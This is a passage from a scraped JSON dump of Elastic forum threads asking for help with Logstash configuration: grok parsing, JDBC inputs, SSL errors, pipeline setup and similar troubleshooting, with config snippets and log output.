    "date": "April 21, 2020, 6:41pm",
    "body": "Hi i have now nearly finished the parsing of my nginx access logfile. This line is the \"user_agent\" field. I parse with my filter already different stuff out of that. Chrome example: \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\" Android example: \"Mozilla/5.0 (Linux; Android 10; Pixel 3) I want to use fingerprint or something to get the version (Android 10 or 10.0) and if possible I want to have in seperate field \"Pixel\" or \"Win64\". Filters: if [event][module] == \"nginx\" { if [fileset][name] == \"access\" { mutate { add_tag => [\"anginx\", \"Anginx\"] } if \"anginx\" in [tags] { grok { match => { \"message\" => \"%{HTTPD_COMMONLOG} %{QS:referrer} %{QS:user_agent}\" } # remove_field => \"message\" } mutate { gsub => [ \"referrer\", '^\"', '', \"referrer\", '\"', '' ] } mutate { gsub => [ \"user_agent\", '^\"', '', \"user_agent\", '\"', '' ] } mutate { add_field => { \"read_timestamp\" => \"%{@timestamp}\" } } date { match => [ \"[nginx][access][time]\", \"dd/MMM/YYYY:H:m:s Z\" ] remove_field => \"[nginx][access][time]\" } useragent { source => \"[user_agent]\" target => \"[ua_parsed]\" add_tag => [\"ua_parsed\"] # remove_field => \"[nginx][access][user_agent]\" } if ([user_agent]) { mutate { add_field => { \"[http][product]\" => \"%{[user_agent]}\" } } mutate { gsub => [ \"[http][product]\", \"(.)\", \" \"] } mutate { add_field => { \"[http][product_version]\" => \"%{[http][product]}\" } } mutate { split => [ \"[http][product]\", \" \" ] } mutate { gsub => [ \"[http][product]\", \"/.\", \"\"] } mutate { split => [ \"[http][product_version]\", \" \" ] } } Pase of a whole Json parsed from Kibana: https://pastebin.com/M3J8p76S",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "9a5ce3d2-0009-43db-8103-0187c0238071",
    "url": "https://discuss.elastic.co/t/issue-with-cast/229104",
    "title": "Issue with CAST",
    "category": [
      "Logstash"
    ],
    "author": "JeremyP",
    "date": "April 21, 2020, 5:16pm April 21, 2020, 5:47pm",
    "body": "Hello, I have an IP address in my database which I'm trying to extract and ingest into Elastic. I originally did a CAST on this statement (required as logstash did not like the source format). input { jdbc { jdbc_connection_string => \"jdbc:postgresql://192.168.65.240:5432/db\" jdbc_user => \"nexpose\" jdbc_password => \"mysecretpassword\" jdbc_driver_class => \"org.postgresql.Driver\" jdbc_default_timezone => \"America/Toronto\" statement => \"SELECT A.asset_id, A.host_name, CAST(ip_address AS text), And my IP addresses are appended with a /32 which is not what I want. I do not want the CIDR as these are always host IP addresses and not ever networks. From playing around with CAST directly on the SQL server, I need to do a CAST(ip_address AS inet), however, this does not appear to be supported on logstash.... error below.... [WARN ] 2020-04-21 13:12:22.417 [[main]<jdbc] jdbc - Exception when executing JDBC query {:exception=>#<Sequel::DatabaseError: Java::OrgLogstash::MissingConverterException: Missing Converter handling for full class name=org.postgresql.util.PGobject, simple name=PGobject> Any suggestions on how I can parse this without the CIDR? Thanks!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "303ac297-314e-45ac-9da5-6830d86efbc9",
    "url": "https://discuss.elastic.co/t/sincedb-clean-after-not-working-in-logstash-plugin/225411",
    "title": "Sincedb_clean_after not working in logstash plugin",
    "category": [
      "Logstash"
    ],
    "author": "Mohsin_Alam",
    "date": "March 27, 2020, 1:05pm April 21, 2020, 4:39pm",
    "body": "This is my config. file for logstash file input plugin: file { id => \"my_plugin_id\" type => \"log\" path => \"/uploads//.log\" mode => \"read\" start_position => beginning sincedb_clean_after => \"10 seconds\" codec => multiline i tried using sincedb_clean_after option it won't work for me. i am trying to re-parse old log which i had already parsed and i understand that logstash creates a db to maintain the file position of the logs and default expire is 14 days. i am trying to reduce is so that i can re-parse log files again but i am unable to do so. Whenever i restart logstash it takes the log irrespective of the scenario if it has been parsed earlier and sincedb_clean_after doesn't seem to work for me. i am using logstash 7.6.1 , please help me with the same. thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c249bc4c-5d80-4ee3-ace0-b94163321f59",
    "url": "https://discuss.elastic.co/t/how-to-get-integer-field-with-comma-seperator-to-add-field/228818",
    "title": "How to get integer field with comma-seperator to add_field",
    "category": [
      "Logstash"
    ],
    "author": "Phornkrit_Hirunyanit",
    "date": "April 20, 2020, 9:21am April 20, 2020, 3:18pm April 21, 2020, 4:24am April 21, 2020, 3:51pm April 21, 2020, 4:14pm",
    "body": "Hello Developer, I have some issue for ask you all I tried to get field %{NUMBER:linenr:int} This is the results At add_field mutate{ add_field => { \"linenrMeassage\" => \"%{fact_or_dim}: %{linenr} rows loaded\" } } This is the results at lineMessage I want %{linenr} with comma-seperator PS. I tried to do this result but it's not working and I also convert => {\"linenr\" => \"integer\"} It's not working too Help me please Regards",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7a30164c-6762-42b4-abda-0bf5ae07bd52",
    "url": "https://discuss.elastic.co/t/loaderror-no-such-file-to-load-bundler/229081",
    "title": "LoadError: no such file to load -- bundler",
    "category": [
      "Logstash"
    ],
    "author": "csaket",
    "date": "April 21, 2020, 3:20pm April 21, 2020, 4:07pm",
    "body": "I am running Fedora 31 and have just installed logstash 7.6.2 When I try to install a plugin I get this error LoadError: no such file to load -- bundler sudo DEBUG=1 /usr/share/logstash/bin/logstash-plugin install --local --no-verify /home/test/logstash-output-test-0.1.3.gem Using GEM_HOME=/usr/share/logstash/vendor/bundle/jruby/2.5.0 Using GEM_PATH=/usr/share/logstash/vendor/bundle/jruby/2.5.0 DEBUG: exec /usr/share/logstash/vendor/jruby/bin/jruby /usr/share/logstash/lib/pluginmanager/main.rb install --local --no-verify /home/test/logstash-output-test-0.1.3.gem LoadError: no such file to load -- bundler require at org/jruby/RubyKernel.java:978 require at /usr/share/logstash/vendor/jruby/lib/ruby/stdlib/rubygems/core_ext/kernel_require.rb:54 <main> at /usr/share/logstash/lib/pluginmanager/bundler/logstash_injector.rb:3 require at org/jruby/RubyKernel.java:978 require at /usr/share/logstash/vendor/jruby/lib/ruby/stdlib/rubygems/core_ext/kernel_require.rb:54 <main> at /usr/share/logstash/lib/pluginmanager/pack_installer/local.rb:3 require at org/jruby/RubyKernel.java:978 require at /usr/share/logstash/vendor/jruby/lib/ruby/stdlib/rubygems/core_ext/kernel_require.rb:54 <main> at /usr/share/logstash/lib/pluginmanager/pack_installer/remote.rb:2 require at org/jruby/RubyKernel.java:978 require at /usr/share/logstash/vendor/jruby/lib/ruby/stdlib/rubygems/core_ext/kernel_require.rb:54 <main> at /usr/share/logstash/lib/pluginmanager/pack_fetch_strategy/repository.rb:5 require at org/jruby/RubyKernel.java:978 require at /usr/share/logstash/vendor/jruby/lib/ruby/stdlib/rubygems/core_ext/kernel_require.rb:54 <main> at /usr/share/logstash/lib/pluginmanager/install_strategy_factory.rb:4 require at org/jruby/RubyKernel.java:978 require at /usr/share/logstash/vendor/jruby/lib/ruby/stdlib/rubygems/core_ext/kernel_require.rb:54 <main> at /usr/share/logstash/lib/pluginmanager/install.rb:3 require at org/jruby/RubyKernel.java:978 require at /usr/share/logstash/vendor/jruby/lib/ruby/stdlib/rubygems/core_ext/kernel_require.rb:54 <main> at /usr/share/logstash/lib/pluginmanager/main.rb:17 Is bundler something that I have to install? I did not have any such problem when I installed the same plugin when using the docker logstash image. I tried a different jruby install to see if it would make any difference but it did not help.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3f823a5a-3fd4-43ec-a9db-8c5cea9e8923",
    "url": "https://discuss.elastic.co/t/fields-vs-tags-for-app-service-environment-identification/228966",
    "title": "Fields vs. tags for app/service/environment identification",
    "category": [
      "Logstash"
    ],
    "author": "intelfx",
    "date": "April 21, 2020, 5:45am April 21, 2020, 3:53pm",
    "body": "Greetings. In our configuration, we are planning to use a single unified ELK stack deployment for all our development needs (i. e. multiple products, each consisting of multiple services, each deployed in multiple environments). This means that we have to separate incoming events at Logstash level for storage in the appropriate indices. The index name will include app name, service name and likely the environment name in order to support different versions of the code having different logging schemata. I see two different options: either providing a set of tags (e. g. [ \"app=foo\", \"service=bar\", \"environment=qa\" ]) to the logger implementation and then parsing those tags into key-value pairs at Logstash level, or providing extra fields (e. g. { \"app\": \"foo\", \"service\": \"bar\", \"environment\": \"qa\" }) via some sort of contextual filter and then simply referring to them at Logstash level to construct the index name. What would be a better/more idiomatic way of doing that?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3ec6f2f5-772a-4df4-bae9-529f7736c0ac",
    "url": "https://discuss.elastic.co/t/logstash-path-type-vs-string-type/228924",
    "title": "Logstash path type Vs string type",
    "category": [
      "Logstash"
    ],
    "author": "nages",
    "date": "April 20, 2020, 7:05pm April 20, 2020, 8:43pm April 21, 2020, 5:45am April 22, 2020, 8:09am",
    "body": "Where is the real difference between \"path\" and string\" and \"hash\" . In terms of appearance, both look similar to the end user . How they are treated anything differently behind the scenes ? https://www.elastic.co/guide/en/logstash/current/configuration-file-structure.html#path",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2aea3540-fec7-49e1-b51d-9bf515d217d3",
    "url": "https://discuss.elastic.co/t/logstash-consuming-too-much-jvm/223860",
    "title": "Logstash Consuming too Much JVM",
    "category": [
      "Logstash"
    ],
    "author": "shrikantgulia",
    "date": "March 17, 2020, 7:39am April 8, 2020, 8:13am April 17, 2020, 1:54pm April 17, 2020, 3:05pm April 18, 2020, 5:23am April 18, 2020, 5:16pm April 19, 2020, 6:45am April 19, 2020, 3:05pm April 21, 2020, 5:52am April 21, 2020, 3:39pm",
    "body": "Hello, My Logstash is Consuming too much JVM due to it Logstash is getting shut down and not receiving any data. I have 4 Pipelines running in my Logstash and Can Some one suggest me What all steps to followed for tunning it image868×303 17.9 KB Thanks in Advance",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "2f2a1e5c-de23-42de-be17-e9b86d2a2357",
    "url": "https://discuss.elastic.co/t/not-able-to-get-my-logstash-7-6-0-running/228963",
    "title": "Not able to get my Logstash 7.6.0 running",
    "category": [
      "Logstash"
    ],
    "author": "vigneshr35",
    "date": "April 21, 2020, 6:04am April 21, 2020, 3:37pm",
    "body": "I am having a hard time setting up my ELK. I was able to start my Elasticsearch instance. I was able to start my Kibana instance. But I am not able to have by Logstash running. Here are the details. elasticsearch.yml configuration is as follows xpack.security.enabled: true xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.verification_mode: certificate xpack.security.transport.ssl.keystore.path: elastic-certificates.p12 xpack.security.transport.ssl.truststore.path: elastic-certificates.p12 xpack.security.http.ssl.enabled: true xpack.security.http.ssl.keystore.path: \"http.p12\" xpack.security.audit.enabled: true Here: elastic-certificates.p12 was created using instructions here http.p12 was created using instructions here Both these files are copied to elasticsearch/config folder logstash.yml is as follows xpack.monitoring.enabled: true xpack.monitoring.elasticsearch.username: logstash_system xpack.monitoring.elasticsearch.password: 'pwdforlogstash' xpack.monitoring.elasticsearch.hosts: [ 'https://localhost:9200' ] I am trying to start logstash with the command: logstash -f D:\\RC\\Softwares\\ELKX\\7.6.0\\*.conf --config.reload.automatic Here are the logs D:\\RC\\Softwares\\ELKX\\7.6.0\\logstash\\bin>logstash -f D:\\RC\\Softwares\\ELKX\\7.6.0\\*.conf --config.reload.automatic Sending Logstash logs to D:/RC/Softwares/ELKX/7.6.0/logstash/logs which is now configured via log4j2.properties [2020-04-21T11:14:38,407][WARN ][logstash.config.source.multilocal] Ignoring the 'pipelines.yml' file because modules or command line options are specified [2020-04-21T11:14:38,574][INFO ][logstash.runner ] Starting Logstash {\"logstash.version\"=>\"7.6.0\"} [2020-04-21T11:14:42,168][ERROR][logstash.licensechecker.licensereader] Unable to retrieve license information from license server {:message=>\"Elasticsearch Unreachable: [https://logstash_system:xxxxxx@localhost:9200/][Manticore::ClientProtocolException] PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\"} [2020-04-21T11:14:42,248][ERROR][logstash.monitoring.internalpipelinesource] Failed to fetch X-Pack information from Elasticsearch. This is likely due to failure to reach a live Elasticsearch cluster. [2020-04-21T11:14:44,534][INFO ][org.reflections.Reflections] Reflections took 128 ms to scan 1 urls, producing 20 keys and 40 values [2020-04-21T11:14:45,215][INFO ][logstash.outputs.elasticsearch][main] Elasticsearch pool URLs updated {:changes=>{:removed=>[], :added=>[https://elastic:xxxxxx@localhost:9200/]}} [2020-04-21T11:14:45,390][WARN ][logstash.outputs.elasticsearch][main] Attempted to resurrect connection to dead ES instance, but got an error. {:url=>\"https://elastic:xxxxxx@localhost:9200/\", :error_type=>LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError, :error=>\"Elasticsearch Unreachable: [https://elastic:xxxxxx@localhost:9200/][Manticore::ClientProtocolException] PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\"} [2020-04-21T11:14:45,437][INFO ][logstash.outputs.elasticsearch][main] New Elasticsearch output {:class=>\"LogStash::Outputs::ElasticSearch\", :hosts=>[\"https://localhost:9200\"]} [2020-04-21T11:14:45,586][WARN ][org.logstash.instrument.metrics.gauge.LazyDelegatingGauge][main] A gauge metric of an unknown type (org.jruby.RubyArray) has been create for key: cluster_uuids. This may result in invalid serialization. It is recommended to log an issue to the responsible developer/development team. [2020-04-21T11:14:45,598][INFO ][logstash.javapipeline ][main] Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>4, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>500, \"pipeline.sources\"=>[\"D:/RC/Softwares/ELKX/7.6.0/simple.conf\"], :thread=>\"#<Thread:0x3ba454d8 run>\"} [2020-04-21T11:14:47,026][INFO ][logstash.javapipeline ][main] Pipeline started {\"pipeline.id\"=>\"main\"} [2020-04-21T11:14:47,216][INFO ][logstash.agent ] Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>[]} [2020-04-21T11:14:47,758][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9600} [2020-04-21T11:14:50,517][WARN ][logstash.outputs.elasticsearch][main] Attempted to resurrect connection to dead ES instance, but got an error. {:url=>\"https://elastic:xxxxxx@localhost:9200/\", :error_type=>LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError, :error=>\"Elasticsearch Unreachable: [https://elastic:xxxxxx@localhost:9200/][Manticore::ClientProtocolException] PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\"} Could you please help me identify what the issue here is? Please let me know if you need any other details.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0604012d-c142-4e2f-a1db-c3d2a0a48b18",
    "url": "https://discuss.elastic.co/t/two-pipelines-act-at-same-time/229003",
    "title": "Two Pipelines ACT at same time",
    "category": [
      "Logstash"
    ],
    "author": "brunojpsantos",
    "date": "April 21, 2020, 9:16am April 21, 2020, 3:25pm April 21, 2020, 3:36pm",
    "body": "Hi! I'm using logstash to import three csv files, I have one pipeline to each file with correct path with the name of each csv file... The problem is: when a file is uploaded, the three pipelines run, and I only want pipeline of that file run. Is this possible? Thanks!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ed3978fe-ba58-4636-b102-12e0b737ee41",
    "url": "https://discuss.elastic.co/t/high-availity-logstash-pipeline/228925",
    "title": "High Availity Logstash Pipeline",
    "category": [
      "Logstash"
    ],
    "author": "ksremo",
    "date": "April 20, 2020, 7:07pm April 20, 2020, 8:44pm April 21, 2020, 7:26am April 21, 2020, 3:32pm",
    "body": "I have 2 Logstash Instances. Both are active. In case of beat-based Logshipper there is a built-in way to load balance the traffic to both Logstash. In case one Logstash is offline because of maintenance or failure traffic is indexed anyways. How to archive this by using an Logstash pipeline input like JDCB, IMAP and so on. What happens if a define a pipeline in both instances. In case of JDBC an database is queried 2 times and this data is double-indexed? What is beast pratice for this use case.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a9609750-c8af-4af7-96f7-c3c528de542b",
    "url": "https://discuss.elastic.co/t/how-can-i-parse-array-of-objects-using-logstash/228640",
    "title": "How can I parse array of objects using Logstash?",
    "category": [
      "Logstash"
    ],
    "author": "cezar996",
    "date": "April 18, 2020, 12:22pm April 18, 2020, 5:11pm April 19, 2020, 2:57am April 20, 2020, 8:53am April 20, 2020, 3:22pm April 21, 2020, 8:29am April 21, 2020, 3:31pm",
    "body": "Hello everybody! Does anybody knows how can I parse an array of objects of this type: [{name:Cezar, age:23}, {name:Leon, age:22}, {name:Steven, age:33}]. Every object should be an event in Discovery Section. Please take into consideration that this array is written in a single line (it comes from some logs extracted in Elasticsearch). I have tried and read a lot of configurations and I did't solve the problem. Thanks in advance!",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "3d0bc6a9-14b7-4efc-9b59-c94e456c5cad",
    "url": "https://discuss.elastic.co/t/logstash-template-for-different-iis-versions/229005",
    "title": "Logstash template for different IIS versions",
    "category": [
      "Logstash"
    ],
    "author": "wonderlust",
    "date": "April 21, 2020, 9:23am April 21, 2020, 1:34pm April 21, 2020, 2:55pm",
    "body": "Hello, I would like to create a logstash template that uses different grok filters for different IIS log versions. So far, Im using an if statement to check the message if contains IIS log version 10.0 or else for older versions like 6.5 and 7.5. The problem is that it uses the grok filter in the first if and it skips the one in the else statement. Here is how my template looks: input { file { type => \"IISLog\" path => \"C:/log/*.log\" start_position => \"beginning\" } } filter { # check IIS version if \"10\" in [message] { # ignore log comments if [message] =~ \"^#\" { drop {} } # check that fields match your IIS log settings grok { match => [\"message\", \"%{TIMESTAMP_ISO8601:log_timestamp} %{NOTSPACE:service_name} %{HOSTNAME} %{IPV6:server_ip_address} %{WORD:method} %{URIPATH:endpoint} %{NOTSPACE:uri_query} %{NUMBER:server_port} %{USERNAME} %{IP:client_ip} %{NOTSPACE:protocol_version} %{NOTSPACE:useragent} %{NOTSPACE:cookie} %{NOTSPACE:previous_url} %{HOSTNAME:host_header} %{NUMBER:status} %{NUMBER:substatus} %{NUMBER:status_win} %{NUMBER:sent_bytes} %{NUMBER:recieved_bytes} %{NUMBER:time_taken}\"] } } else { # ignore log comments if [message] =~ \"^#\" { drop {} } # check that fields match your IIS log settings grok { match => [\"message\", \"%{TIMESTAMP_ISO8601:log_timestamp} %{IP:server_ip_address} %{WORD:method} %{URIPATH:endpoint} %{NOTSPACE:uri_query} %{NUMBER:server_port} %{USERNAME} %{IP:client_ip} %{NOTSPACE:useragent} %{NUMBER:status} %{NUMBER:substatus} %{NUMBER:status_win} %{NUMBER:time_taken}\"] } } # set the event timestamp from the log # https://www.elastic.co/guide/en/logstash/current/plugains-filters-date.html date { match => [ \"log_timestamp\", \"YYYY-MM-dd HH:mm:ss\" ] timezone => \"Etc/UCT\" } # matches the big, long nasty useragent string to the actual browser name, version, etc # https://www.elastic.co/guide/en/logstash/current/plugins-filters-useragent.html useragent { source=> \"useragent\" prefix=> \"browser_\" } mutate { remove_field => [ \"log_timestamp\"] } } # output logs to console and to elasticsearch output { stdout { codec => rubydebug } elasticsearch { hosts => [\"127.0.0.1:9200\"] index => \"logstash-%{+YYYY.MM.dd}\" manage_template => true template => \"C:\\logstash-7.6.0\\bin\\template.json\" template_overwrite => \"true\" codec => json } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "aa5d6387-6514-43b2-97da-6f79e9f63b8e",
    "url": "https://discuss.elastic.co/t/logstash-filter-to-extract-email-and-credit-card/226736",
    "title": "Logstash filter to extract email and credit card",
    "category": [
      "Logstash"
    ],
    "author": "AnanthMahadevan",
    "date": "April 6, 2020, 2:45pm April 6, 2020, 4:00pm April 7, 2020, 6:07am April 7, 2020, 8:16am April 21, 2020, 2:28pm",
    "body": "I am new to logstash and want to extract email IDs and credit card details from files. I am using filebeat to pass log files to logstash and also have setup a config file with the grok patterns. However, I am not able to extract either emailID or credit card. I get this error: \"tags\" => [ [0] \"beats_input_codec_plain_applied\", [1] \"_grokparsefailure\" Given below is my config file (the pattern works in the grokdebug app). input { beats { port => 5044 host => \"0.0.0.0\" } } filter { if [message] =~ \"(?<ccNumber>\\d{4}-\\d{4}-\\d{4})\" { mutate { add_tag => [\"ccNumber\"] } } else if [message] =~ \"(?<emailID>[a-zA-Z0-9_.+=:-]+@[0-9A-Za-z][0-9A-Za-z-]{0,62}(?:\\.(?:[0-9A-Za-z][0-‌​9A-Za-z-]{0,62}))*)\" { mutate { add_tag => [\"emailID\"] } } else { grok { match => { \"message\" => '%{HTTPD_COMMONLOG} \"%{GREEDYDATA:referrer} %{GREEDYDATA:agent}\"' } } } mutate { convert => { \"response\" => \"integer\" \"bytes\" => \"integer\" } } } output { stdout { codec => rubydebug } file { path => \"logs\\output.txt\" } }",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d0412583-333b-4954-bea4-14625ef4719b",
    "url": "https://discuss.elastic.co/t/jdbc-input-plugin-back-pressure/229065",
    "title": "JDBC input plugin : back pressure?",
    "category": [
      "Logstash"
    ],
    "author": "deslauriersp",
    "date": "April 21, 2020, 2:03pm",
    "body": "I have a pipiline, with a jdbc input, http filter (adds data from a rest service), and an http output. The JDBC input, seem to run on a schedule. What will happen if all the events created by the previous query have not been processed before the next execution of the Jdbc Input plugin? Is it back-pressure sensitive? If output to HTTP received 429 response code, will the jdbc plugin play nice, or just keep querying on schedule.?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8b58b810-ac52-4f93-a33d-80d3122434fe",
    "url": "https://discuss.elastic.co/t/comparing-two-similar-fields-in-two-grok-patterns/229062",
    "title": "Comparing Two similar fields in two grok patterns",
    "category": [
      "Logstash"
    ],
    "author": "tushant_gaur",
    "date": "April 21, 2020, 1:52pm",
    "body": "HI , I have two grok patterns that has one common field , and there is timestamp field associated with these grok patterns . Am able to make a mapping of common field wih their respective timestamps. But not able to do like if [common filed in grok 1] == [common filed in grok 2] {ruby { code => \"event.set('[response]', (event.get('[time stamp in grok2]').to_f1000)-(event.get('[timestamp in grok 1]').to_f1000))\" } } Kindly help plzz.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "60bf2a3f-63c0-4328-bef9-d62256aba8ce",
    "url": "https://discuss.elastic.co/t/logstash-elasticsearch-input-doesnt-start/227924",
    "title": "Logstash \"elasticsearch\" input doesn't start",
    "category": [
      "Logstash"
    ],
    "author": "gpolini",
    "date": "April 14, 2020, 1:30pm April 21, 2020, 1:27pm",
    "body": "Hi! I'm trying to add new fields in my index documents which are calculated from data already present in the documents. For example, I have two timestamps and I have to calculate the difference in seconds. I wrote a logstash configuration file that take data from elatsicserach index and put the output updating documents. It seems that the routine doesn't start, even if I've specified the tag schedule or scroll (not both of them). This is imy input: input { elasticsearch { hosts => \"my_host:9200\" index => \"my_index*\" query => '{ \"query\": { \"bool\": { \"filter\": [ { \"exists\": { \"field\": \"time_closed\" } }, { \"exists\": { \"field\": \"time_open\" } }, { \"match_phrase\": { \"calc_done\": false } }, { \"range\": { \"@timestamp\": { \"gt\": \"now-3d\", \"lt\": \"now\" } } } ] } } }' tags => [\"my_tag\"] # schedule => \"30 * * * *\" user => \"my_elastic_user\" password => \"my_elastic_password\" scroll => \"10m\" size => 10000 docinfo => true } } I tried the query in a curl request, it returns every documents that I expect. This is my input: filter { if \"my_tag\" in [tags] { .. some calculation mutate { replace => { \"[calc_done]\" => true } } } } This is my output: output { if \"my_tag\" in [tags] { elasticsearch { hosts => [ \"http://my_host:9200\" ] user => \"my_logstash_user\" password => \"my_logstash_password\" index => \"%{[@metadata][_index]}\" action => \"update\" doc_as_upsert => true document_id => \"%{[@metadata][_id]}\" } } } I don't see any log for this routine in logstash and elasticserach log file... In every documents the file \"calc_done\" is false and no calculations are done... Thanks in advance Giacomo",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7735b581-4174-45f4-b8bc-46a61e9083df",
    "url": "https://discuss.elastic.co/t/need-to-monitor-pending-messages-in-jms-queue-for-tibco/228885",
    "title": "Need to monitor pending messages in JMS queue for tibco",
    "category": [
      "Logstash"
    ],
    "author": "BPant",
    "date": "April 20, 2020, 2:28pm April 21, 2020, 1:27pm",
    "body": "Hi, I want to monitor pending messages in a jms queue for tibco. I tried to use jms logstash plugin, however it doesn't give me the parameter \"pending queue messages\". This is my logstash configuration: jmsconfig.conf: input { jms { include_header => true include_properties => true include_body => true use_jms_timestamp => false interval => 10 destination => \"logstash.queue\" yaml_file => \"/usr/share/logstash/config/jms/jms.yml\" yaml_section => \"ems\" factory_settings => { exclusive_consumer => false } } } output { elasticsearch { ilm_enabled => false manage_template => false hosts => '${ELASTIC_URL}' user => \"${ELASTIC_USERNAME}\" password => \"${ELASTIC_PASSWORD}\" index => \"tibcoems-%{+yyyy.MM.dd}\" } } jms.yml: ems: :factory: com.tibco.tibjms.TibjmsConnectionFactory :serverUrl: tcp://XXXXX:7222 :username: ********* :password: *********** :require_jars: - /home/ec2-user/ELK/shared/jms-2.0.jar - /home/ec2-user/ELK/shared/tibjms.jar",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a7357cb1-50a6-40f5-aa82-f934aeca81a8",
    "url": "https://discuss.elastic.co/t/websocket-input-plugin-tibco-mashery-connection-connectrefused/229043",
    "title": "Websocket Input PlugIn TIBCO Mashery Connection::ConnectRefused",
    "category": [
      "Logstash"
    ],
    "author": "Loris",
    "date": "April 21, 2020, 1:00pm",
    "body": "Hi all, I wanted to create a Logstash pipeline that uses the websocket input plugin to connects to a TIBCO Mashery websocket. I tried with the following, very simple, pipeline configuration: input { websocket { id => \"ws\" url => \"wss://logstream-api.mashery.com/ecls/subscribe/***/***?key=***\" type => \"string\" mode => \"client\" } } filter {} output { stdout {} } When I run Logstash with this pipeline I get the following output: [2020-04-21T08:50:36,324][WARN ][logstash.inputs.websocket][main] websocket input client threw exception, restarting {:exception=>#<FTW::Connection::ConnectRefused: logstream-api.mashery.com[34.232.148.67]:80> We tried to contact the websocket and got a reply, so it seems the problem is Logstash. The version used is 7.6.2. Thank you Loris",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "fac7c62e-f08c-42ef-95f3-71a71c788e3f",
    "url": "https://discuss.elastic.co/t/logstash-keystore-doesnt-work/229034",
    "title": "Logstash Keystore doesn't work",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 21, 2020, 12:30pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d1da838a-ae3d-4eef-b13c-db538e6cf67e",
    "url": "https://discuss.elastic.co/t/calculating-count-and-percentage/229029",
    "title": "Calculating count and percentage",
    "category": [
      "Logstash"
    ],
    "author": "rcganesh",
    "date": "April 21, 2020, 12:12pm",
    "body": "Hello Experts, I am couple of weeks old to Logstash and I need some help in trasforming data through logstash and send it to either some file or Elasticsearch. Below is the data-flow we are implementing. Input data into logstash from Elasticsearch Transform data received from Elasticsearch Output the transformed data into some file or Elasticsearch What data to be transformed? We need to calculate the percentage of \"ServiceCommonAttributes.ExternalStatus.StatusCode\" (refer Elasticsearch input below) based some values in this field. For instance, if \"ServiceCommonAttributes.ExternalStatus.StatusCode\" in ('0','41100') is considered success. So, we need to evaluate this data for, say, last 5 minutes and calculate percentage of success for last 5 minutes. What challenge we are facing? The biggest challenge we are facing here is to get the total count (not sum) of \"ServiceCommonAttributes.ExternalStatus.StatusCode\" filed values for last 5 minutes. I believe, once we figure out how to get the count for last 5 minutes, we can use RUBY filter to calculate the percentage. Is this the right approach? We have achieved calculating percentage by \"Metaquery\" plugin in Grafana. However, this plugin doesnot support alert notification. So, the other option we thought of is to use logstash. After lots of reserach and googling, we found that Metrics filter can be used for calculating count. However, there is no much documentation on how to use this filter for Elasticsearch input data. If not Metrics filter, then any other filter which can fulfill the requirement will do. Any help, suggestions or inputs are really appreciated. Thanks in advance. Ravi Chandran Elasticserach Input: { \"_index\": \"MON\", \"_type\": \"_doc\", \"_id\": \"jSpSlHExC4JXqSgNty-7Of\", \"_version\": 1, \"_score\": null, \"_source\": { \"gte\": \"http://www.somelink.com\", \"ServiceCommonAttributes\": { \"MessageIdentifier\": \"Monitoring\\\\TXN\", \"ProcessName\": \"My Query\", \"ResponseStatus\": \"Technical Failure\", \"InternalStatus\": { \"StatusCode\": \"191\", \"StatusDescription\": \"ERROR:191:Account is not active.\" }, \"ServiceStartTime\": \"2020-04-20T00:25:22.063+03:00\", \"ServiceEndTime\": \"2020-04-20T00:25:22.113+03:00\", \"ExternalStatus\": { \"StatusCode\": \"41028\", \"StatusDescription\": \"Account is not active.\" }, \"ResponseTimeE2E\": 50 }, \"fields\": { \"ServiceCommonAttributes.ServiceEndTime\": [ \"2020-04-19T21:25:22.113Z\" ], \"ServiceCommonAttributes.ServiceStartTime\": [ \"2020-04-19T21:25:22.063Z\" ] }, \"sort\": [ 1587331522063 ] } } Logstash config: input { elasticsearch { hosts => \"es-server\" index => \"MON\" query => '{ \"query\": { \"match_all\": {} } }' scroll => \"5m\" schedule => \"*/2 * * * *\" } } filter { if [StatusCode] >= 0 { metrics { meter => \"[ServiceCommonAttributes][ExternalStatus][StatusCode]\" add_tag => \"process\" } } } output { # only emit events with the 'metric' tag elasticsearch { hosts => [\"es-server:9200\"] index => \"MON_logstash\" } if \"process\" in [tags] { stdout { codec => line { format => \"count: %{[ServiceCommonAttributes][ExternalStatus][StatusCode][count]}\" } } } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "66520136-83e8-4884-9a6d-f80845670c2d",
    "url": "https://discuss.elastic.co/t/logstash-ruby-filter-execution-of-the-filter-occurs-only-once-for-cloned-or-splitted-events/227323",
    "title": "[Logstash - Ruby Filter] - Execution of the filter occurs only once for cloned or splitted events",
    "category": [
      "Logstash"
    ],
    "author": "druiz61",
